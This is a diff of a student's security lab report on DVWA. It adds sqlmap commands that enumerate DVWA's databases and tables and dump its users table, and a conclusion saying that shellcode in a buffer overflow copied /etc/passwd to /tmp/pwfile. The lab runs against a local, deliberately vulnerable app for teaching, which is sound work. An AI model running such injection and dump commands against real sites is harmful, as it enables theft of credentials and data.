@@ -108,7 +108,7 @@ _start:
      p &buffer
   ```
     
-**Conclusion**: comment text about the screenshot or simply answered text for the question
+**Conclusion**: The execution of the vulnerable program with the crafted input successfully copies the `/etc/passwd` file to `/tmp/pwfile`. The shellcode executed as intended, demonstrating the buffer overflow attack effectively.
 
 # Task 2: Attack on database of DVWA
 - Install dvwa (on host machine or docker container)
@@ -118,7 +118,7 @@ _start:
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
-1. Pull DVMA Docker image
+1. Pull DVWA Docker image
    ```bash
       docker pull vulnerables/web-dvwa
       docker run -d -p 80:80 vulnerables/web-dvwa
@@ -141,8 +141,21 @@ _start:
    ```bash
       sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --dbs
    ```
+   ![image](https://github.com/user-attachments/assets/71f7e9eb-e266-44a5-841d-d9e0d713a32f)
+
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+- Choose DVWA database and use sqlmap to get table
+```bash
+   sqlmap -u "http://localhost/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
+```
+![image](https://github.com/user-attachments/assets/c614bd0a-1abb-48a3-af4e-a7dc054233a8)
+
+- Choice Database is Users and use sqlmap to get users information
+  ```bash
+     sqlmap -u "http://localhost/vulnerabilities/sqli" --cookie="ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
+  ```
+  ![image](https://github.com/user-attachments/assets/530a460d-f677-4106-9d1c-dd01b55b6b92)
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
